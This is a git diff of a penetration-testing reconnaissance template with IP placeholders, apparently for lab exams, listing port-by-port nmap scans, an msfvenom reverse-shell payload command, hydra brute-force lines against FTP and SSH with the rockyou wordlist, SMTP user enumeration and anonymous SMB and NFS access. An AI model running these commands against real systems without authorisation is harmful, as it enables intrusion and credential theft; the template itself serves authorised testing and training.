@@ -11,193 +11,133 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=4444 -f elf -o s
 
 ### Full TCP Scan
 INSERTFULLTCPSCAN
-
+```
+nmap -sV -Pn -p1-65535 --max-retries 1 --max-scan-delay 10 --defeat-rst-ratelimit --open -T4 INSERTIPADDRESS
+```
 ### Full UDP Scan
 INSERTUDPSCAN
-
+```
+nmap -Pn -A -sC -sU -T 4 --top-ports 200 INSERTIPADDRESS
+```
 ### Vuln Scan
 INSERTVULNSCAN
-
+```
+nmap --script=vuln INSERTIPADDRESS
+```
+### Other scans
 ```
 Always start with a stealthy scan to avoid closing ports.
 
 # Syn-scan
 nmap -sS INSERTIPADDRESS
 
-# Scan all ports, might take a while.
-nmap INSERTIPADDRESS -p-
-
-# Service-version, default scripts, OS:
-nmap INSERTIPADDRESS -sV -sC -O -p 111,222,333
-
-# Scan for UDP
-nmap INSERTIPADDRESS -sU
-unicornscan -mU -v -I INSERTIPADDRESS
-
 # Connect to udp if one is open
 nc -u INSERTIPADDRESS 48772
+
+# Connect to tcp if one is open
+nc -nv INSERTIPADDRESS 5472
 
 # Monster scan
 nmap INSERTIPADDRESS -p- -A -T4 -sC
 
-# Vulnerability Scan
-nmap --script=vuln INSERTIPADDRESS
 ```
 
-
 ### Port 21 - FTP
-
-- FTP-Name:
-- FTP-version:
-- Anonymous login:
-
 INSERTFTPTEST
 
 ```
 nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS
+hydra -I -e ns -l root -P /usr/share/wordlists/rockyou.txt ftp://INSERTIPADDRESS
 ```
 
 ### Port 22 - SSH
-
-- Name:
-- Version:
-- Takes-password:
-- If you have usernames test login with username:username
-
 INSERTSSHCONNECT
 
 INSERTSSHBRUTE
 
 ```
-hydra -I -t 5 -l username -P passwordfile INSERTIPADDRESS -e ns
+hydra -I -e ns -l root -P /usr/share/wordlists/rockyou.txt ssh://INSERTIPADDRESS
 ```
 
 ### Port 25 - SMTP
-
-- Name:
-- Version:
-- VRFY:
-
 INSERTSMTPCONNECT
 
 ```
-nc -nvv INSERTIPADDRESS 25
-HELO foo<cr><lf>
-
-telnet INSERTIPADDRESS 25
-VRFY root
-
 nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 INSERTIPADDRESS
+smtp-user-enum -M RCPT -U /usr/share/wordlists/metasploit/unix_users.txt -t INSERTIPADDRESS
+smtp-user-enum -M EXPN -U /usr/share/wordlists/metasploit/unix_users.txt -t INSERTIPADDRESS
+smtp-user-enum -M RCPT -U /usr/share/wordlists/metasploit/unix_users.txt -t INSERTIPADDRESS
 ```
 
-### Port 69 - UDP - TFTP
-
-This is used for tftp-server.
-
 ### Port 110 - Pop3
-
-- Name:
-- Version:
-
 INSERTPOP3CONNECT
 
 ```
 telnet INSERTIPADDRESS 110
 USER pelle@INSERTIPADDRESS
 PASS admin
-
 or:
-
 USER pelle
 PASS admin
-
 # List all emails
 list
-
+stat
 # Retrieve email number 5, for example
 retr 9
 ```
 
-### Port 111 - Rpcbind
+### Port 143/993 - Imap
+```
+nmap -p 143,993 --script imap-brute INSERTIPADDRESS
+```
 
+### Port 135 - MSRPC
+INSERTRPCMAP
+
+### Port 111 - Rpcbind
 ```
 rpcinfo -p INSERTIPADDRESS
 ```
 
-
-### Port 135 - MSRPC
-
-INSERTRPCMAP
-
-### Port 143 - Imap
-
 ### Port 139/445 
-
-### SMBmap
 INSERTSMBMAP
 
 ```
 mkdir /tmp/share
 mount -t cifs //INSERTIPADDRESS/C$ /tmp/share
 ```
-
 ### Password Policy
 INSERTSAMRDUMP
 
 ```
-nmap --script=smb-* INSERTIPADDRESS -p 445
-
-
+https://blog.ropnop.com/using-credentials-to-own-windows-boxes/
 enum4linux -a INSERTIPADDRESS
 rpcclient -U "" INSERTIPADDRESS
-	srvinfo
-	enumdomusers
-	getdompwinfo
-	querydominfo
-	netshareenum
-	netshareenumall
-
-smbclient -L INSERTIPADDRESS
-smbclient //INSERTIPADDRESS/tmp
 smbclient //INSERTIPADDRESS/ipc$ 
-smbclient //INSERTIPADDRESS/admin$
-smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
-smbclient //INSERTIPADDRESS/ipc$ -U john  
 ```
 
 ### Port 161/162 UDP - SNMP
-
 Look for installed programs and other ports that are opened and may have been missed
+INSERTSNMPSCAN
 
 ```
 nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS
 onesixtyone -c /root/Dropbox/Wordlists/wordlist-common-snmp-community-strings.txt INSERTIPADDRESS
 snmp-check INSERTIPADDRESS -c public
-```
-
-```
 # Common community strings
 public
 private
 community
 ```
 
-INSERTSNMPSCAN
-
 ### Port 443 - HTTPS
-
 INSERTSSLSCAN
 
 ```
-# Heartbleed
 sslscan INSERTIPADDRESS:443
 ```
 
-### Port 554 - RTSP
-
-
 ### Port 1030/1032/1033/1038
-
 Used by RPC to connect in domain network.
 
 ### Port 1521 - Oracle
@@ -212,14 +152,11 @@ tnscmd10g status -h INSERTIPADDRESS
 ```
 
 ### Port 2049 - NFS
-
 INSERTNFSSCAN
 
 ```
 showmount -e INSERTIPADDRESS
-
 If you find anything you can mount it like this:
-
 mount INSERTIPADDRESS:/ /tmp/NFS
 mount -t INSERTIPADDRESS:/ /tmp/NFS
 ```
@@ -260,53 +197,26 @@ mysql --host=INSERTIPADDRESS -u root -p
 ## Webservers 
 
 ### Automated Checks
-
 INSERTWIGSCAN
 
 INSERTWIGSSLSCAN
 
 ### Nikto scan
-
 INSERTNIKTOSCAN
 
 ### Directories
-
 INSERTDIRBSCAN
 
 INSERTDIRBSSLSCAN
 
 ### Robots
-
 INSERTROBOTS
 
 ### Default/Weak login
-
 Google documentation for default passwords and test them:
-
 ```
-site:webapplication.com password
+http://open-sez.me/
 https://cirt.net/passwords
-```
-
-```
-admin admin
-admin password
-admin <blank>
-admin nameofservice
-root root
-root admin
-root password
-root nameofservice
-<username if you have> password
-<username if you have> admin
-<username if you have> username
-<username if you have> nameofservice
-```
-```
-Step 3: 
-Browse around and look for disclosed PII on site
-
-*Place anything here
 ```
 
 ### Manual Checks
